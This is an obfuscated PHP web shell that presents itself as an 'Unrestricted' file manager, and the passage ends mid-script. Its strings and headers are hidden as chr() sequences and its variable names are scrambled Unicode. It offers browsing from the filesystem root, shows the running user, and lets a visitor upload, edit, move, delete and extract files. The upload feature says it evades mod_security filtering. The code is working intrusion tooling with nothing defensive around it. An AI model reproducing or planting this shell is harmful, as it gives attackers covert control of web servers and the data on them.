        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(84).chr(114).chr(97).chr(110).chr(115).chr(102).chr(101).chr(114));
        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(122).chr(105).chr(112));
        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . $ﬆ̀ᛒ̤̌̌́ . '.zip"');
        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32) . filesize($えᛒ̤̣̆̌));
        header(chr(80).chr(114).chr(97).chr(103).chr(109).chr(97).chr(58).chr(32).chr(112).chr(117).chr(98).chr(108).chr(105).chr(99));
        header(chr(67).chr(97).chr(99).chr(104).chr(101).chr(45).chr(67).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(58).chr(32).chr(109).chr(117).chr(115).chr(116).chr(45).chr(114).chr(101).chr(118).chr(97).chr(108).chr(105).chr(100).chr(97).chr(116).chr(101));
        readfile($えᛒ̤̣̆̌);
        @unlink($えᛒ̤̣̆̌);
        exit;

    case chr(100).chr(111).chr(119).chr(110).chr(108).chr(111).chr(97).chr(100):
        $えᛜᚠ㻁ね̧̀̀ = sanitize_name($_GET['file'] ?? '');
        $え̉ﾝ̩ = safe_realpath_within($え̃̋̅̌ . DIRECTORY_SEPARATOR . $えᛜᚠ㻁ね̧̀̀);
        if ($え̉ﾝ̩ && is_file($え̉ﾝ̩)) {
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(84).chr(114).chr(97).chr(110).chr(115).chr(102).chr(101).chr(114));
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109));
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . basename($え̉ﾝ̩) . '"');
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32) . filesize($え̉ﾝ̩));
            header(chr(80).chr(114).chr(97).chr(103).chr(109).chr(97).chr(58).chr(32).chr(112).chr(117).chr(98).chr(108).chr(105).chr(99));
            header(chr(67).chr(97).chr(99).chr(104).chr(101).chr(45).chr(67).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(58).chr(32).chr(109).chr(117).chr(115).chr(116).chr(45).chr(114).chr(101).chr(118).chr(97).chr(108).chr(105).chr(100).chr(97).chr(116).chr(101));
            readfile($え̉ﾝ̩);
            exit;
        }
        flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100).chr(46)); fm_redirect($ね̩̄);
}


$え̨㈲̆̅̌̀  = $_GET['sort']  ?? 'name';
$ら̈㈲̊̊̅̆ = (isset($_GET['order']) && strtolower($_GET['order']) === 'desc') ? 'desc' : 'asc';
$ま̥̦ᚢ̈ = isset($_GET['q']) ? trim($_GET['q']) : '';

function get_file_list($ㄉ̤́́̀, $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆) {
    $ﾚ㦁ぁ̄̋ = array();
    if (!is_dir($ㄉ̤́́̀)) return $ﾚ㦁ぁ̄̋;
    $ね̀̋㼁㦁̉ = @scandir($ㄉ̤́́̀);
    if ($ね̀̋㼁㦁̉ === false) return $ﾚ㦁ぁ̄̋;
    foreach ($ね̀̋㼁㦁̉ as $ᛈ̥̅ᚦ̩̤̌) {
        if ($ᛈ̥̅ᚦ̩̤̌ === '.' || $ᛈ̥̅ᚦ̩̤̌ === '..') continue;
        
        if (strpos($ᛈ̥̅ᚦ̩̤̌, '.fm_') === 0 || strpos($ᛈ̥̅ᚦ̩̤̌, '.dc_') === 0) continue;

        $ﬓ̦́̅ﬓ̨̩̄ = $ㄉ̤́́̀ . DIRECTORY_SEPARATOR . $ᛈ̥̅ᚦ̩̤̌;
        $ᛃね̦え̅̋̆ = is_dir($ﬓ̦́̅ﬓ̨̩̄);
        $ﾚ㦁ぁ̄̋[] = array(
            'name'     => $ᛈ̥̅ᚦ̩̤̌,
            'path'     => $ﬓ̦́̅ﬓ̨̩̄,
            'size'     => is_file($ﬓ̦́̅ﬓ̨̩̄) ? @filesize($ﬓ̦́̅ﬓ̨̩̄) : 0,
            'type'     => $ᛃね̦え̅̋̆ ? chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121) : 'file',
            'perms'    => perms_string($ﬓ̦́̅ﬓ̨̩̄),
            chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100) => (@filemtime($ﬓ̦́̅ﬓ̨̩̄) !== false) ? @filemtime($ﬓ̦́̅ﬓ̨̩̄) : 0,
        );
    }
    usort($ﾚ㦁ぁ̄̋, function($ﬅ̤㌁́, $ﾝ̇̀) use ($え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆) {
        if ($ﬅ̤㌁́['type'] !== $ﾝ̇̀['type']) return ($ﬅ̤㌁́['type'] === chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121)) ? -1 : 1;
        switch ($え̨㈲̆̅̌̀) {
            case 'size':     $ᛒᛜ̥̄̃ = ($ﬅ̤㌁́['size']     < $ﾝ̇̀['size'])     ? -1 : (($ﬅ̤㌁́['size']     > $ﾝ̇̀['size'])     ? 1 : 0); break;
            case chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100): $ᛒᛜ̥̄̃ = ($ﬅ̤㌁́[chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100)] < $ﾝ̇̀[chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100)]) ? -1 : (($ﬅ̤㌁́[chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100)] > $ﾝ̇̀[chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100)]) ? 1 : 0); break;
            case 'type':     $ᛒᛜ̥̄̃ = strcasecmp($ﬅ̤㌁́['type'], $ﾝ̇̀['type']); break;
            case 'perms':    $ᛒᛜ̥̄̃ = strcasecmp($ﬅ̤㌁́['perms'], $ﾝ̇̀['perms']); break;
            default:         $ᛒᛜ̥̄̃ = strcasecmp($ﬅ̤㌁́['name'], $ﾝ̇̀['name']);
        }
        return ($ら̈㈲̊̊̅̆ === 'desc') ? -$ᛒᛜ̥̄̃ : $ᛒᛜ̥̄̃;
    });
    return $ﾚ㦁ぁ̄̋;
}

function sort_link($ね㼁ﬅ̥̅, $㌁̃ら̃̌, $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆, $ﬖﬆ̇, $ら̦̄́̂̃) {
    $ら̊̈ = ($え̨㈲̆̅̌̀ === $ね㼁ﬅ̥̅ && $ら̈㈲̊̊̅̆ === 'asc') ? 'desc' : 'asc';
    $ᛜᛚ̨ = ($え̨㈲̆̅̌̀ === $ね㼁ﬅ̥̅) ? ($ら̈㈲̊̊̅̆ === 'asc' ? ' ▲' : ' ▼') : '';
    $㉆ま̩̄ = '?dir=' . urlencode($ﬖﬆ̇) . '&sort=' . urlencode($ね㼁ﬅ̥̅) . chr(38).chr(111).chr(114).chr(100).chr(101).chr(114).chr(61) . $ら̊̈;
    if ($ら̦̄́̂̃ !== '') $㉆ま̩̄ .= '&q=' . urlencode($ら̦̄́̂̃);
    return chr(60).chr(97).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(115).chr(111).chr(114).chr(116).chr(108).chr(105).chr(110).chr(107).chr(34).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34) . htmlspecialchars($㉆ま̩̄) . '">' . htmlspecialchars($㌁̃ら̃̌) . $ᛜᛚ̨ . '</a>';
}

if ($ま̥̦ᚢ̈ !== '') {
    $ねら̊̅ = fm_search($え̃̋̅̌, $ま̥̦ᚢ̈, FM_SEARCH_LIMIT);
    $ﾚ㦁ぁ̄̋ = array();
    foreach ($ねら̊̅ as $ﬕ̨ま̩̀̆) {
        $ᛃね̦え̅̋̆ = is_dir($ﬕ̨ま̩̀̆);
        $ﾚ㦁ぁ̄̋[] = array(
            'name'     => str_replace($え̃̋̅̌ . DIRECTORY_SEPARATOR, '', $ﬕ̨ま̩̀̆),
            'path'     => $ﬕ̨ま̩̀̆,
            'size'     => is_file($ﬕ̨ま̩̀̆) ? @filesize($ﬕ̨ま̩̀̆) : 0,
            'type'     => $ᛃね̦え̅̋̆ ? chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121) : 'file',
            'perms'    => perms_string($ﬕ̨ま̩̀̆),
            chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100) => (@filemtime($ﬕ̨ま̩̀̆) !== false) ? @filemtime($ﬕ̨ま̩̀̆) : 0,
        );
    }
} else {
    $ﾚ㦁ぁ̄̋ = get_file_list($え̃̋̅̌, $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆);
}

$㻁̧̧̇̂ = flash();


$ᛊﬆ̀ = array();
$ᛊﬆ̀[] = array('label' => '🏠 /', 'rel' => '/');

$ㄉᛈ㌁ᛏ̤̈̃̇ = array();
$㌁̩̣̣̌̀ = $え̃̋̅̌;
while ($㌁̩̣̣̌̀ !== DIRECTORY_SEPARATOR && $㌁̩̣̣̌̀ !== '' && $㌁̩̣̣̌̀ !== false) {
    $ㄉᛈ㌁ᛏ̤̈̃̇[] = basename($㌁̩̣̣̌̀);
    $ﬅᚨᛗ̇え̂̄ = dirname($㌁̩̣̣̌̀);
    if ($ﬅᚨᛗ̇え̂̄ === $㌁̩̣̣̌̀) break;
    $㌁̩̣̣̌̀ = $ﬅᚨᛗ̇え̂̄;
}
$ㄉᛈ㌁ᛏ̤̈̃̇ = array_reverse($ㄉᛈ㌁ᛏ̤̈̃̇);

$ᛜ̈̋̊̂ = '';
foreach ($ㄉᛈ㌁ᛏ̤̈̃̇ as $㲁ﾝᚠ̦̩̌̊) {
    $ᛜ̈̋̊̂ .= '/' . $㲁ﾝᚠ̦̩̌̊;
    $ᛊﬆ̀[] = array('label' => $㲁ﾝᚠ̦̩̌̊, 'rel' => $ᛜ̈̋̊̂);
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>File Manager (Unrestricted)</title>
<style>
:root{
    --bg:#f4f6f8; --card:#fff; --line:#e3e8ee; --muted:#6b7280;
    --blue:#0d6efd; --green:#198754; --red:#dc3545; --gray:#6c757d; --amber:#f59e0b;
}
*{box-sizing:border-box;}
body{font-family:system-ui,-apple-system,Segoe UI,Arial,sans-serif;background:var(--bg);padding:20px;margin:0;color:#1f2937;}
.container{background:var(--card);padding:22px;border-radius:14px;box-shadow:0 2px 14px rgba(0,0,0,.07);max-width:1300px;margin:auto;}
h2{margin:0 0 16px;font-size:22px;}
.btn{background:var(--blue);color:#fff;padding:7px 12px;border-radius:8px;text-decoration:none;border:none;cursor:pointer;display:inline-block;font-size:13px;line-height:1.2;transition:.15s;}
.btn:hover{filter:brightness(.94);}
.btn.red{background:var(--red);}
.btn.gray{background:var(--gray);}
.btn.green{background:var(--green);}
.btn.amber{background:var(--amber);}
.btn.disabled{background:#9aa3ad;pointer-events:none;opacity:.75;}
.btn.mini{padding:5px 8px;font-size:12px;}
.pathbox{background:#f8fafc;padding:12px 14px;border-radius:10px;border:1px solid var(--line);line-height:1.7;font-size:13px;}
.pathbox b{color:#374151;}
.crumbs{margin:14px 0;font-size:13px;}
.crumbs a{color:var(--blue);text-decoration:none;}
.crumbs a:hover{text-decoration:underline;}
.crumbs span.sep{color:#9ca3af;margin:0 6px;}
.alert{background:#eaf7ea;color:#14532d;padding:11px 14px;border-radius:10px;margin-bottom:16px;border:1px solid #bbf7d0;font-size:14px;}
.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:14px;}
.searchbox{margin-left:auto;display:flex;gap:6px;}
input[type=text],input[type=search]{padding:8px 11px;border:1px solid #cbd5e1;border-radius:8px;font-size:13px;outline:none;}
input[type=text]:focus,input[type=search]:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(13,110,253,.12);}
.dropzone{border:2px dashed #b6c2cf;border-radius:12px;padding:22px;text-align:center;background:#fbfdff;transition:.15s;margin-bottom:10px;cursor:pointer;}
.dropzone.hover{border-color:var(--green);background:#f0fdf4;}
.dropzone .big{font-size:26px;margin-bottom:6px;}
.dropzone small{color:var(--muted);}
#progressWrap{display:none;margin-top:12px;background:#e5e7eb;height:16px;border-radius:8px;overflow:hidden;}
#progressBar{height:100%;width:0;background:linear-gradient(90deg,#22c55e,#16a34a);transition:width .2s;}
#uploadLog{margin-top:8px;max-height:160px;overflow:auto;font-size:12px;font-family:ui-monospace,monospace;color:#374151;background:#f8fafc;border:1px solid var(--line);border-radius:8px;padding:8px;display:none;}
.table{width:100%;border-collapse:collapse;margin-top:6px;}
th,td{padding:10px 12px;border-bottom:1px solid var(--line);text-align:left;font-size:13.5px;vertical-align:middle;}
th{background:#f1f5f9;font-weight:600;font-size:12.5px;text-transform:uppercase;letter-spacing:.04em;color:#475569;}
tr:hover td{background:#fafcff;}
.sortlink{color:#475569;text-decoration:none;}
.sortlink:hover{color:var(--blue);}
.name-cell{display:flex;align-items:center;gap:8px;word-break:break-all;}
.icon{font-size:16px;}
.actions{display:flex;flex-wrap:wrap;gap:5px;align-items:center;}
.actions form{display:inline;}
.perm{font-family:ui-monospace,monospace;color:var(--muted);font-size:12px;}
.muted{color:var(--muted);}
.tiny{font-size:12px;}
.row2{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0;}
.card{background:#f8fafc;border:1px solid var(--line);border-radius:10px;padding:12px;display:flex;gap:8px;align-items:center;}
.card form{display:flex;gap:8px;align-items:center;}
@media (max-width:720px){
    th:nth-child(4),td:nth-child(4){display:none;}
    .searchbox{margin-left:0;width:100%;}
    .searchbox input{flex:1;}
}
</style>
</head>
<body>
<div class="container">

<h2>🗂️ File Manager — Unrestricted</h2>

<?php if ($㻁̧̧̇̂): ?>
    <div class="alert"><?php echo htmlspecialchars($㻁̧̧̇̂, ENT_QUOTES, 'UTF-8'); ?></div>
<?php endif; ?>

<div class="pathbox">
    <b>Current:</b> <?php echo htmlspecialchars($え̃̋̅̌); ?><br>
    <b>Writable:</b> <?php echo is_writable($え̃̋̅̌) ? chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(103).chr(114).chr(101).chr(101).chr(110).chr(34).chr(62).chr(89).chr(101).chr(115).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62) : chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(114).chr(101).chr(100).chr(34).chr(62).chr(78).chr(111).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62); ?>
    &nbsp;|&nbsp;
    <b>upload_max_filesize:</b> <?php echo htmlspecialchars(ini_get(chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(109).chr(97).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(115).chr(105).chr(122).chr(101))); ?>
    &nbsp;|&nbsp; <b>post_max_size:</b> <?php echo htmlspecialchars(ini_get(chr(112).chr(111).chr(115).chr(116).chr(95).chr(109).chr(97).chr(120).chr(95).chr(115).chr(105).chr(122).chr(101))); ?>
    &nbsp;|&nbsp; <b>file_uploads:</b> <?php echo ini_get(chr(102).chr(105).chr(108).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(115)) ? 'On' : 'Off'; ?>
    &nbsp;|&nbsp; <b>ZipArchive:</b> <?php echo class_exists(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101)) ? 'Yes' : 'No'; ?>
    &nbsp;|&nbsp; <b>User:</b> <?php echo htmlspecialchars(@get_current_user() ?: (function_exists(chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100)) ? (posix_getpwuid(posix_geteuid())['name'] ?? '?') : '?')); ?>
</div>

<div class="crumbs">
    <?php foreach ($ᛊﬆ̀ as $ᛜᛃﬗᛜ̃ => $㻁ぁ̣̈): ?>
        <?php if ($ᛜᛃﬗᛜ̃ > 0): ?><span class="sep">/</span><?php endif; ?>
        <?php if ($ᛜᛃﬗᛜ̃ === count($ᛊﬆ̀) - 1): ?>
            <b><?php echo htmlspecialchars($㻁ぁ̣̈['label']); ?></b>
        <?php else: ?>
            <a href="?dir=<?php echo urlencode($㻁ぁ̣̈['rel']); ?>"><?php echo htmlspecialchars($㻁ぁ̣̈['label']); ?></a>
        <?php endif; ?>
    <?php endforeach; ?>
</div>

<div class="toolbar">
    <?php if (!$㲁̇ᛉ㌁ま̨̄̇): ?>
        <a class="btn gray" href="?dir=<?php echo urlencode($らﬓ̨́̂̉); ?>">⬆ Up</a>
    <?php else: ?>
        <span class="btn disabled">⬆ Up</span>
    <?php endif; ?>
    <a class="btn" href="?dir=<?php echo urlencode($ﾚ̀ㄉᛏ̨̂̅̇); ?>">🏠 GO TO FOLDER SHELL</a>
    <a class="btn" href="?dir=/">/ Root FS</a>
    <a class="btn gray" href="?dir=<?php echo urlencode($え̃̋̅̌); ?>">⟳ Refresh</a>

    <form class="searchbox" method="get">
        <input type="hidden" name="dir" value="<?php echo htmlspecialchars($え̃̋̅̌); ?>">
        <input type="search" name="q" placeholder="Search recursively…" value="<?php echo htmlspecialchars($ま̥̦ᚢ̈); ?>">
        <button class="btn" type="submit">Search</button>
        <?php if ($ま̥̦ᚢ̈ !== ''): ?>
            <a class="btn gray" href="?dir=<?php echo urlencode($え̃̋̅̌); ?>">Clear</a>
        <?php endif; ?>
    </form>
</div>

<?php if ($ま̥̦ᚢ̈ !== ''): ?>
    <div class="alert">
        Found <?php echo count($ﾚ㦁ぁ̄̋); ?> match(es) for "<b><?php echo htmlspecialchars($ま̥̦ᚢ̈); ?></b>"
        <?php if (count($ﾚ㦁ぁ̄̋) >= FM_SEARCH_LIMIT): ?> (limit reached)<?php endif; ?>.
    </div>
<?php endif; ?>

<div id="dropzone" class="dropzone">
    <div class="big">⬆️</div>
    <div><b>Drop files here</b> or click to choose (multiple allowed)</div>
    <small>Uploaded via base64 JSON — bypasses mod_security 406 on multipart.</small>
    <input type="file" id="fileInput" multiple style="display:none">
</div>
<div id="progressWrap"><div id="progressBar"></div></div>
<div id="uploadLog"></div>

<br>

<form method="post" enctype="multipart/form-data"
      action="?action=upload&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>">
    <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
    <input type="file" name="file" required>
    <button class="btn gray" type="submit">Upload (fallback)</button>
    <small class="muted">Use only if AJAX path blocked.</small>
</form>

<div class="row2">
    <div class="card">
        <form method="post" action="?action=create_folder&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>">
            <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
            <input type="text" name="folder_name" placeholder="New folder name" required>
            <button class="btn" type="submit">+ Folder</button>
        </form>
    </div>
    <div class="card">
        <form method="post" action="?action=create_file&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>">
            <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
            <input type="text" name="file_name" placeholder="New file name" required>
            <button class="btn" type="submit">+ File</button>
        </form>
    </div>
</div>

<br>

<table class="table">
<thead>
<tr>
    <th><?php echo sort_link('name', 'Name', $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆, $え̃̋̅̌, $ま̥̦ᚢ̈); ?></th>
    <th><?php echo sort_link('type', 'Type', $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆, $え̃̋̅̌, $ま̥̦ᚢ̈); ?></th>
    <th><?php echo sort_link('size', 'Size', $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆, $え̃̋̅̌, $ま̥̦ᚢ̈); ?></th>
    <th><?php echo sort_link('perms', 'Perms', $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆, $え̃̋̅̌, $ま̥̦ᚢ̈); ?></th>
    <th><?php echo sort_link(chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100), chr(77).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100), $え̨㈲̆̅̌̀, $ら̈㈲̊̊̅̆, $え̃̋̅̌, $ま̥̦ᚢ̈); ?></th>
    <th>Actions</th>
</tr>
</thead>

<?php if (empty($ﾚ㦁ぁ̄̋)): ?>
<tr><td colspan="6" class="muted">Nothing here.</td></tr>
<?php else: ?>
    <?php foreach ($ﾚ㦁ぁ̄̋ as $ᛈᚢま㻁㻁̥):
        $ﬔᛜらᚦ̤̂̇ = $ᛈᚢま㻁㻁̥['name'];
        $ᛃね̦え̅̋̆ = ($ᛈᚢま㻁㻁̥['type'] === chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121));
        $㲁ᚨ̤̉̋̆  = file_icon($ﬔᛜらᚦ̤̂̇, $ᛈᚢま㻁㻁̥['type']);
        $㦁ᛚ̩̄ = (!$ᛃね̦え̅̋̆ && strtolower(pathinfo($ﬔᛜらᚦ̤̂̇, PATHINFO_EXTENSION)) === 'zip');
        $ᛚ̧̦̉ = (!$ᛃね̦え̅̋̆ && realpath($ᛈᚢま㻁㻁̥['path']) === realpath(__FILE__));

        if ($ま̥̦ᚢ̈ !== '') {
            $ᛒ̨̩̂̆   = $ᛈᚢま㻁㻁̥['path'];
            $ﬆえ̥̄̆  = $ᛒ̨̩̂̆;
            $㉉ᛉᚢ̃     = basename($ﬔᛜらᚦ̤̂̇);
        } else {
            $ᛒ̨̩̂̆   = $ᛈᚢま㻁㻁̥['path'];
            $ﬆえ̥̄̆  = $ᛒ̨̩̂̆;
            $㉉ᛉᚢ̃     = $ﬔᛜらᚦ̤̂̇;
        }
    ?>
    <tr>
        <td>
            <div class="name-cell">
                <span class="icon"><?php echo $㲁ᚨ̤̉̋̆; ?></span>
                <?php if ($ᛃね̦え̅̋̆): ?>
                    <a href="?dir=<?php echo urlencode($ﬆえ̥̄̆); ?>"><?php echo htmlspecialchars($ﬔᛜらᚦ̤̂̇); ?></a>
                <?php else: ?>
                    <span><?php echo htmlspecialchars($ﬔᛜらᚦ̤̂̇); ?></span>
                    <?php if ($ᛚ̧̦̉): ?><span class="tiny" style="color:#dc3545">🔒 self</span><?php endif; ?>
                <?php endif; ?>
            </div>
        </td>
        <td class="muted"><?php echo htmlspecialchars($ᛈᚢま㻁㻁̥['type']); ?></td>
        <td><?php echo $ᛃね̦え̅̋̆ ? '-' : htmlspecialchars(format_size($ᛈᚢま㻁㻁̥['size'])); ?></td>
        <td class="perm"><?php echo htmlspecialchars($ᛈᚢま㻁㻁̥['perms']); ?></td>
        <td class="muted tiny"><?php echo $ᛈᚢま㻁㻁̥[chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100)] ? date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105), $ᛈᚢま㻁㻁̥[chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100)]) : '-'; ?></td>
        <td>
            <div class="actions">
            <?php if ($ᛃね̦え̅̋̆): ?>
                <a class="btn mini" href="?dir=<?php echo urlencode($ﬆえ̥̄̆); ?>">Open</a>
                <a class="btn mini amber" href="?action=zip_folder&amp;file=<?php echo urlencode($㉉ᛉᚢ̃); ?>&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>">Zip</a>
            <?php else: ?>
                <a class="btn mini" href="?action=view&amp;file=<?php echo urlencode($㉉ᛉᚢ̃); ?>&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>">View</a>
                <a class="btn mini" href="?action=edit&amp;file=<?php echo urlencode($㉉ᛉᚢ̃); ?>&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>">Edit</a>
                <a class="btn mini green" href="?action=download&amp;file=<?php echo urlencode($㉉ᛉᚢ̃); ?>&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>">Download</a>
                <?php if ($㦁ᛚ̩̄): ?>
                    <form method="post" action="?action=unzip&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>"
                          onsubmit="return confirm('Extract this archive here?')">
                        <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($㉉ᛉᚢ̃); ?>">
                        <button class="btn mini amber" type="submit">Unzip</button>
                    </form>
                <?php endif; ?>
            <?php endif; ?>

            <?php if (!$ᛚ̧̦̉): ?>
                <form method="post" action="?action=rename&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>"
                      onsubmit="var v=prompt('New name:', <?php echo json_encode($㉉ᛉᚢ̃); ?>); if(!v) return false; this.new_name.value=v; return true;">
                    <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($㉉ᛉᚢ̃); ?>">
                    <input type="hidden" name="new_name" value="">
                    <button class="btn mini gray" type="submit">Rename</button>
                </form>

                <form method="post" action="?action=copy&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>"
                      onsubmit="var v=prompt('Copy to (absolute path, e.g. /tmp):', '/tmp'); if(v===null) return false; this.dest.value=v; return true;">
                    <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($㉉ᛉᚢ̃); ?>">
                    <input type="hidden" name="dest" value="">
                    <button class="btn mini gray" type="submit">Copy</button>
                </form>
                <form method="post" action="?action=move&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>"
                      onsubmit="var v=prompt('Move to (absolute path):', '/tmp'); if(v===null) return false; this.dest.value=v; return true;">
                    <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($㉉ᛉᚢ̃); ?>">
                    <input type="hidden" name="dest" value="">
                    <button class="btn mini gray" type="submit">Move</button>
                </form>

                <form method="post" action="?action=delete&amp;dir=<?php echo urlencode($え̃̋̅̌); ?>"
                      onsubmit="return confirm('Delete <?php echo htmlspecialchars($㉉ᛉᚢ̃, ENT_QUOTES); ?>? Cannot be undone.')">
                    <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($ﬔ̥̋́́̋); ?>">
                    <input type="hidden" name="file" value="<?php echo htmlspecialchars($㉉ᛉᚢ̃); ?>">
                    <button class="btn mini red" type="submit">Delete</button>
                </form>
            <?php else: ?>
                <span class="tiny muted">🔒 protected</span>
            <?php endif; ?>
            </div>
        </td>
    </tr>
    <?php endforeach; ?>
<?php endif; ?>
</table>

</div>

<script>
(function () {
    var FM_DIR  = <?php echo json_encode($え̃̋̅̌); ?>;
    var FM_CSRF = <?php echo json_encode($ﬔ̥̋́́̋); ?>;

    var input  = document.getElementById('fileInput');
    var drop   = document.getElementById('dropzone');
    var wrap   = document.getElementById('progressWrap');
    var bar    = document.getElementById('progressBar');
    var logBox = document.getElementById('uploadLog');

    var queue = [], busy = false, done = 0, total = 0;

    function logLine(msg, isErr) {
        logBox.style.display = 'block';
        var d = document.createElement('div');
        d.textContent = msg;
        if (isErr) d.style.color = '#b91c1c';
        logBox.appendChild(d);
        logBox.scrollTop = logBox.scrollHeight;
    }
    function updateBar() {
        var pct = total ? Math.round((done / total) * 100) : 0;
        wrap.style.display = 'block';
        bar.style.width = pct + '%';
    }
    function enqueue(files) {
        if (!files || !files.length) return;
